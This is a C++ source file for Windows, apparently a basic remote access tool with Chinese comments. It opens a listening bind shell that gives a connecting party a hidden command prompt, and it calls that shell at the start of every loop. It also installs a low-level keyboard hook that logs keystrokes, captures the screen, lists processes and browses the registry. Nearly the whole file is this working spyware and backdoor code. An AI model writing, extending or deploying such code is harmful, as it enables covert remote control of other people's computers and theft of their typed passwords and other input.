#pragma comment(lib,"ws2_32.lib")
#include <winsock2.h>
#include <psapi.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <locale>
#include <codecvt>

#define MasterPort 99 //定义监听端口

// 全局变量，用于保存按键记录
std::string keyLog;

std::wstring StringToWideString(const std::string& str) {
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.from_bytes(str);
}

std::string WideStringToString(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

LPCWSTR CharToLPCWSTR(const char* charString) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, charString, -1, NULL, 0);
    wchar_t* wString = new wchar_t[size_needed];
    MultiByteToWideChar(CP_UTF8, 0, charString, -1, wString, size_needed);
    return wString;
}

LPWSTR CharToLPWSTR(const char* charString) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, charString, -1, NULL, 0);
    LPWSTR wString = new WCHAR[size_needed];
    MultiByteToWideChar(CP_UTF8, 0, charString, -1, wString, size_needed);
    return wString;
}

LRESULT CALLBACK KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

        // 检查按键是否为按下或弹起
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char key = static_cast<char>(kbStruct->vkCode);

            // 输出控制键的信息
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
                std::cout << "[Ctrl]";
            }
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                std::cout << "[Shift]";
            }
            if (GetAsyncKeyState(VK_MENU) & 0x8000) {
                std::cout << "[Alt]";
            }

            // 过滤掉非打印字符
            if (key == VK_RETURN) {
                std::cout << "[Enter]";
            }
            else if (key == VK_SPACE) {
                std::cout << "[Space]";
            }
            else if (key == VK_TAB) {
                std::cout << "[Tab]";
            }
            else if (key == VK_BACK) {
                std::cout << "[Backspace]";
            }
            else if (key == VK_ESCAPE) {
                std::cout << "[Esc]";
            }
            else if (key == VK_MENU) {
                std::cout << "[Alt]";
            }
            else if (key == VK_UP) {
                std::cout << "[Up]";
            }
            else if (key == VK_DOWN) {
                std::cout << "[Down]";
            }
            else if (key == VK_LEFT) {
                std::cout << "[Left]";
            }
            else if (key == VK_RIGHT) {
                std::cout << "[Right]";
            }
            else if (key == VK_F1) {
                std::cout << "[F1]";
            }
            else if (key == VK_F2) {
                std::cout << "[F2]";
            }
            else if (key == VK_F3) {
                std::cout << "[F3]";
            }
            else if (key == VK_F4) {
                std::cout << "[F4]";
            }
            else if (key == VK_F5) {
                std::cout << "[F5]";
            }
            else if (key == VK_F6) {
                std::cout << "[F6]";
            }
            else if (key == VK_F7) {
                std::cout << "[F7]";
            }
            else if (key == VK_F8) {
                std::cout << "[F8]";
            }
            else if (key == VK_F9) {
                std::cout << "[F9]";
            }
            else if (key == VK_F10) {
                std::cout << "[F10]";
            }
            else if (key == VK_NUMPAD0) {
                std::cout << "0";
            }
            else if (key == VK_NUMPAD1) {
                std::cout << "1";
            }
            else if (key == VK_NUMPAD2) {
                std::cout << "2";
            }
            else if (key == VK_NUMPAD3) {
                std::cout << "3";
            }
            else if (key == VK_NUMPAD4) {
                std::cout << "4";
            }
            else if (key == VK_NUMPAD5) {
                std::cout << "5";
            }
            else if (key == VK_NUMPAD6) {
                std::cout << "6";
            }
            else if (key == VK_NUMPAD7) {
                std::cout << "7";
            }
            else if (key == VK_NUMPAD8) {
                std::cout << "8";
            }
            else if (key == VK_NUMPAD9) {
                std::cout << "9";
            }
            else if (key == VK_MULTIPLY) {
                std::cout << "*";
            }
            else if (key == VK_ADD) {
                std::cout << "+";
            }
            else if (key == VK_SUBTRACT) {
                std::cout << "-";
            }
            else if (key == VK_DIVIDE) {
                std::cout << "/";
            }
            else if (key == VK_DECIMAL) {
                std::cout << ".";
            }
            else if (key == VK_NUMLOCK) {
                std::cout << "[Numlock]";
            }
            else if (key >= 32 && key <= 126) {
                std::cout << key;
            }
        }
    }

    // 调用下一个钩子
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void CaptureScreen(const wchar_t* fileName) {
    // 获取屏幕DC
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    // 获取屏幕尺寸
    int screenWidth = GetDeviceCaps(hdcScreen, DESKTOPHORZRES);
    int screenHeight = GetDeviceCaps(hdcScreen, DESKTOPVERTRES);
    printf("W: %d\n", screenWidth);
    printf("H: %d\n", screenHeight);

    // 创建位图
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);

    // 拷贝屏幕内容到内存DC
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    // 获取位图信息
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    // 获取位图数据
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;  // 32位色深
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;

    // 获取位图数据大小
    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;

    // 分配内存保存位图数据
    BYTE* lpBmp = new BYTE[dwBmpSize];

    // 获取位图数据
    GetDIBits(hdcScreen, hBitmap, 0, bmp.bmHeight, lpBmp, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    // 保存位图到文件
    HANDLE hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error creating file!" << std::endl;
        delete[] lpBmp;
        return;
    }

    // 添加BMP文件头
    BITMAPFILEHEADER bmfHeader;
    bmfHeader.bfType = 0x4D42;  // "BM"
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    DWORD dwWritten = 0;
    WriteFile(hFile, &bmfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, lpBmp, dwBmpSize, &dwWritten, NULL);

    // 释放资源
    CloseHandle(hFile);
    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMem);
    DeleteObject(hBitmap);
    delete[] lpBmp;

    std::wcout << L"Screenshot saved to " << fileName << std::endl;
}

int shell()
{
    WSADATA WSADa;
    sockaddr_in SockAddrIn;
    SOCKET CSocket, SSocket;
    int iAddrSize;
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo;
    char szCMDPath[255];
    //分配内存资源，初始化数据
    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&WSADa, sizeof(WSADa));
    //获取CMD路径
    GetEnvironmentVariable(CharToLPCWSTR("COMSPEC"), CharToLPWSTR(szCMDPath), sizeof(szCMDPath));
    //加载ws2_32.dll
    WSAStartup(0x0202, &WSADa);
    //设置本地信息和绑定协议，建议Socket
    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;
    SockAddrIn.sin_port = htons(MasterPort);
    CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    //设置绑定端口 999
    bind(CSocket, (sockaddr*)&SockAddrIn, sizeof(SockAddrIn));
    //设置服务器监听端口
    listen(CSocket, 1);
    iAddrSize = sizeof(SockAddrIn);
    SSocket = accept(CSocket, (sockaddr*)&SockAddrIn, &iAddrSize);
    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.wShowWindow = SW_HIDE;
    StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    StartupInfo.hStdInput = (HANDLE)SSocket;
    StartupInfo.hStdOutput = (HANDLE)SSocket;
    StartupInfo.hStdError = (HANDLE)SSocket;
    //创建匿名管道
    CreateProcess(NULL, CharToLPWSTR(szCMDPath), NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);
    //关闭进程句柄
    closesocket(CSocket);
    closesocket(SSocket);
    WSACleanup();
    //关闭连接卸载ws2_32.dll
    return 0;
}

void ListProcesses() {
    DWORD processes[1024];
    DWORD cbNeeded;

    // 获取系统中运行的所有进程的PID
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        // 计算有多少个进程
        DWORD numProcesses = cbNeeded / sizeof(DWORD);

        std::cout << "Processes:" << std::endl;

        for (DWORD i = 0; i < numProcesses; ++i) {
            // 打开进程句柄
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);

            if (hProcess != NULL) {
                // 获取进程模块信息
                HMODULE hModule;
                DWORD cbNeededModule;

                if (EnumProcessModules(hProcess, &hModule, sizeof(hModule), &cbNeededModule)) {
                    TCHAR szProcessName[MAX_PATH];

                    // 获取进程名
                    if (GetModuleBaseName(hProcess, hModule, szProcessName, sizeof(szProcessName) / sizeof(TCHAR))) {
                        std::wcout << "PID: " << processes[i] << "\tProcess Name: " << szProcessName << std::endl;
                    }
                }

                // 关闭进程句柄
                CloseHandle(hProcess);
            }
        }
    }
    else {
        std::cerr << "Failed to enumerate processes. Error code: " << GetLastError() << std::endl;
    }
}

void ListKeys(HKEY hKey) {
    DWORD index = 0;
    WCHAR subKeyName[MAX_PATH];
    DWORD subKeyNameSize = sizeof(subKeyName) / sizeof(subKeyName[0]);

    while (RegEnumKeyEx(hKey, index, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        std::wcout << subKeyName << std::endl;
        ++index;
        subKeyNameSize = sizeof(subKeyName) / sizeof(subKeyName[0]);
    }
}

void PrintValue(HKEY hKey, const std::wstring& valueName) {
    DWORD valueType;
    DWORD dataSize;

    // 查询值的数据大小
    if (RegQueryValueEx(hKey, valueName.c_str(), NULL, &valueType, NULL, &dataSize) == ERROR_SUCCESS) {
        if (valueType == REG_SZ || valueType == REG_EXPAND_SZ || valueType == REG_MULTI_SZ) {
            // 分配足够的内存来存储字符串数据
            WCHAR* buffer = new WCHAR[dataSize / sizeof(WCHAR)];

            // 查询并输出字符串数据
            if (RegQueryValueEx(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<BYTE*>(buffer), &dataSize) == ERROR_SUCCESS) {
                std::wcout << buffer << std::endl;
            }
            else {
                std::cerr << "Error querying value. Error code: " << GetLastError() << std::endl;
            }

            delete[] buffer;
        }
        else if (valueType == REG_DWORD) {
            // 对于 DWORD 数据，直接输出
            DWORD data;

            if (RegQueryValueEx(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<BYTE*>(&data), &dataSize) == ERROR_SUCCESS) {
                std::cout << data << std::endl;
            }
            else {
                std::cerr << "Error querying value. Error code: " << GetLastError() << std::endl;
            }
        }
        else {
            std::cout << "error" << std::endl;
        }
    }
    else {
        std::cerr << "Error querying value size. Error code: " << GetLastError() << std::endl;
    }
}

void ListValues(HKEY hKey) {
    DWORD index = 0;
    WCHAR valueName[MAX_PATH];
    DWORD valueNameSize = sizeof(valueName) / sizeof(valueName[0]);
    DWORD valueType;
    DWORD dataSize;

    while (RegEnumValue(hKey, index, valueName, &valueNameSize, NULL, &valueType, NULL, &dataSize) == ERROR_SUCCESS) {
        std::wcout << valueName << std::endl;
        ++index;
        valueNameSize = sizeof(valueName) / sizeof(valueName[0]);
    }
}

int viewregister() {
    HKEY currentKey = HKEY_LOCAL_MACHINE;
    std::wstring currentPath = L"";

    std::string command;
    while (true) {
        std::cout << "[" << WideStringToString(currentPath) << "]> ";
        std::getline(std::cin, command);

        if (command == "ls") {
            ListKeys(currentKey);
        }
        else if (command.compare(0, 2, "cd") == 0) {
            std::wstring path = StringToWideString(command.substr(3));

            HKEY newKey;
            if (RegOpenKeyEx(currentKey, path.c_str(), 0, KEY_READ, &newKey) == ERROR_SUCCESS) {
                currentKey = newKey;
                currentPath = path;
            }
            else {
                std::cerr << "Error changing directory." << std::endl;
            }
        }
        else if (command.compare(0, 3, "cat") == 0) {
            std::wstring valueName = StringToWideString(command.substr(4));
            PrintValue(currentKey, valueName);
        }
        else if (command == "query") {
            ListValues(currentKey);
        }
        else if (command == "exit") {
            break;
        }
        else {
            std::cerr << "Unknown command." << std::endl;
        }
    }

    RegCloseKey(currentKey);

    return 0;
}

int main() {
    std::cout << "shell, process, screenshot, key, register" << std::endl;
    while (1) {
        char cmd[10];
        std::cout << "cmd: ";
        shell();
        std::cin >> cmd;
        if (strcmp(cmd, "shell") == 0) {
            shell();
        }
        if (strcmp(cmd, "process") == 0) {
            ListProcesses();
        }
        if (strcmp(cmd, "screenshot") == 0) {
            const wchar_t* fileName = L"screenshot.bmp";
            CaptureScreen(fileName);
        }
        if (strcmp(cmd, "key") == 0) {
            // 安装键盘钩子
            HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, GetModuleHandle(NULL), 0);

            if (keyboardHook == NULL) {
                std::cerr << "Failed to install keyboard hook." << std::endl;
                return 1;
            }

            // 消息循环，等待用户按下Ctrl+C退出
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) != 0) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }

            // 卸载钩子
            UnhookWindowsHookEx(keyboardHook);

            // 输出按键记录
            // std::cout << "Key Log: " << keyLog << std::endl;
        }
        if (strcmp(cmd, "register") == 0) {
            viewregister();
        }
    }

    return 0;
}
